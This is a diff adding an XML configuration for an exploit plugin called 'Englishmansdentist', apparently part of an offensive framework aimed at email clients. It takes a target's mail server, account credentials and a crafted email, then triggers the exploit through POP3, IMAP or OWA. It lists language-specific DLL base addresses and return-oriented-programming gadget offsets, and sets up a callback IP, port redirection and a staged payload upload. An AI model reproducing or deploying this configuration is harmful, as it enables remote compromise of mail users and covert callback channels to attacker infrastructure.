@@ -1,0 +1,137 @@
+<?xml version="1.0"?>
+<t:config id="2f4f9295a93af5a5e72580a71fc3832efd6cbdf1"
+          name="Englishmansdentist"
+          version="1.2.0"
+          configversion="1.2.0.0"
+          xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
+          xmlns:t='tc0'>
+  <t:inputparameters>
+  
+  
+<!-- All plugins that accept a callback must have the Callback* parameters
+     listed below, or their equivalents. -->
+     
+	<t:parameter name="TargetIp" description="Target IP Address" type="IPv4"/>
+	<t:parameter name="TargetPort" description="Target SMTP Mail Port to send email (typically 25)" type="TcpPort" default="25"/>
+	
+<!-- Add TargetEmailAddressValue, EmailSubjectValue, EmailFromAddressValue, EmailBodyValue back in -->	
+    <t:parameter name="TargetEmailAddressValue"  type="String" description="Target Email Address"/>
+    <t:parameter name="EmailSubjectValue" type="String" description="Email Subject (make unique for later email deletion)"/>
+    <t:parameter name="EmailFromAddressValue" type="String" description="Email From Address" default=""/>
+    <t:parameter name="EmailBodyValue" type="String" description="Email Body" default=""/>       
+
+	<!-- Now using dbghelp.dll base addresses which are language dependent -->	
+    <t:paramchoice name="Language" description="Target OS Language">	
+      <t:paramgroup name="English" description="English OS Language">
+        <t:parameter name="DBGHELP" description="" type="U32" value="0x6d580000" hidden="true"/>
+        <t:parameter name="OLECNV32" description="" type="U32" value="0x71db0000" hidden="true"/>
+      </t:paramgroup> 
+      <t:paramgroup name="German" description="German OS Language">
+        <t:parameter name="DBGHELP" description="" type="U32" value="0x6d790000" hidden="true"/>
+        <t:parameter name="OLECNV32" description="" type="U32" value="0x71bc0000" hidden="true"/>        
+      </t:paramgroup>  
+       <t:paramgroup name="Korean" description="Korean OS Language">
+        <t:parameter name="DBGHELP" description="" type="U32" value="0x6d8e0000" hidden="true"/>
+        <t:parameter name="OLECNV32" description="" type="U32" value="0x71c50000" hidden="true"/>               
+      </t:paramgroup> 
+      <t:paramgroup name="Simplified_Chinese" description="Simplified Chinese OS Language">
+        <t:parameter name="DBGHELP" description="" type="U32" value="0x6d830000" hidden="true"/>
+        <t:parameter name="OLECNV32" description="" type="U32" value="0x71d00000" hidden="true"/>                
+      </t:paramgroup>  
+      <t:paramgroup name="Traditional_Chinese" description="Traditional Chinese OS Language">
+        <t:parameter name="DBGHELP" description="" type="U32" value="0x6d840000" hidden="true"/>
+        <t:parameter name="OLECNV32" description="" type="U32" value="0x71d10000" hidden="true"/>                
+      </t:paramgroup>                                                             
+    </t:paramchoice>       
+  
+	<!-- Added next set of parameters outside of TargetExch since exchange version no longer matters -->
+	<t:parameter name="dbghelp_return_01a0" description="" type="U32" value="0x00081cfd" hidden="true"/>
+	<t:parameter name="dbghelp_virtual_alloc" description="" type="U32" value="0x00001104" hidden="true"/>
+	<t:parameter name="dbghelp_pop_into_ecx" description="" type="U32" value="0x00019568" hidden="true"/>
+	<t:parameter name="dbghelp_pop_into_esi" description="" type="U32" value="0x00013b71" hidden="true"/>
+	<t:parameter name="dbghelp_mov_ptrecx_to_eax_ret" description="" type="U32" value="0x0005c464" hidden="true"/>
+	<t:parameter name="dbghelp_mov_ecx_to_ptreax_ret8" description="" type="U32" value="0x00063f8b" hidden="true"/>
+	<t:parameter name="dbghelp_jmp_eax" description="" type="U32" value="0x0002f71d" hidden="true"/>	
+
+                 
+    <t:parameter name="CallbackIp" description="Callback IP Address" type="IPv4"/> 
+      
+    <t:parameter name="CallbackPort" description="Callback Port" type="TcpPort" default="0"/>
+    
+    <!-- Added CallbackLocalPort for redirection -->
+    <t:parameter name="CallbackLocalPort" description="Local Callback Port" type="TcpPort" required="false"/>       
+
+    <t:parameter name="NetworkTimeout" description="Network Timeout (seconds).  Use -1 for no timeout." type="S16" default="60"/>
+
+	<!-- Added parameters independent of auth mode since everything must be authenticated -->
+    <t:parameter name="TargetUserName" description="Username of Target Email Account" type="String"/>
+    <t:parameter name="TargetUserPassword" description="Password of Target Email Account" type="String"/>
+
+    <t:paramchoice name="MailCheckProtocol" description="Protocol to Trigger Target's Exploited Email">
+        <t:paramgroup name="POP3" description="">
+			<t:parameter name="MailCheckPort" description="Target POP3 Port" type="TcpPort" default="110"/>
+		</t:paramgroup>
+        <t:paramgroup name="IMAP" description="">
+       		<t:parameter name="MailCheckPort" description="Target IMAP Port" type="TcpPort" default="143"/>
+		</t:paramgroup>
+		
+<!-- Parameters for OWA -->
+        <t:paramgroup name="OWA" description="">
+			<t:paramchoice name="OWAMode" description="Protocol to Trigger Target's OWA mail" default="HTTPS">
+				<t:paramgroup name="HTTP" description="Use HTTP only for OWA">
+					<t:parameter name="MailCheckPort" description="Target OWA Port" type="TcpPort" default="80"/>
+				</t:paramgroup>
+				<t:paramgroup name="HTTPS" description="Use HTTPS only for OWA">
+					<t:parameter name="MailCheckPort" description="Target OWA Port" type="TcpPort" default="443"/>
+				</t:paramgroup>
+			</t:paramchoice>
+			<t:parameter name="OWADelay"
+                description="Delay in milliseconds between each OWA HTTP request"
+                type="S16"
+                default="3000"/>
+	    </t:paramgroup>
+	</t:paramchoice>  	
+	<t:parameter name="AuthCode" description="Egg Authentication Code (typically, don't change)" type="U32" default="0"/>     
+  </t:inputparameters> 
+  
+  <t:outputparameters>
+    <t:parameter name="Contract"
+                 description="Contract Fulfilled by This Plugin"
+                 type="String"
+                 value="StagedUpload"/>
+                        
+    <!-- Added next three parameters per Jake -->          
+    <t:parameter name="XorMask"
+             description=""
+             type="U8"/>           
+    <t:parameter name="ConnectedTcp"
+             description="Connected TCP Socket to Target"
+             type="Socket"/> 
+    <t:parameter name="AuthCode"
+             description="Egg Authentication Code"
+             type="U32"/>                                      
+  </t:outputparameters>
+  
+  <t:redirection>
+    
+     <t:local protocol="TCP"
+              listenaddr="TargetIp"
+              listenport="TargetPort"
+              destaddr="//identifier"
+              destport="//service[name='smtp']/port"
+              closeoncompletion="true"/>
+              
+     <t:local protocol="TCP"
+             listenaddr="TargetIp"
+             listenport="MailCheckPort"
+             destaddr="//identifier"
+             destport="//service[name='pop3_imap_owa']/port"
+             closeoncompletion="true"/>             
+    
+    <t:remote protocol="TCP"
+               listenaddr="CallbackIp"
+               listenport="CallbackPort"
+               destport="CallbackLocalPort"/>
+
+  </t:redirection>
+</t:config>
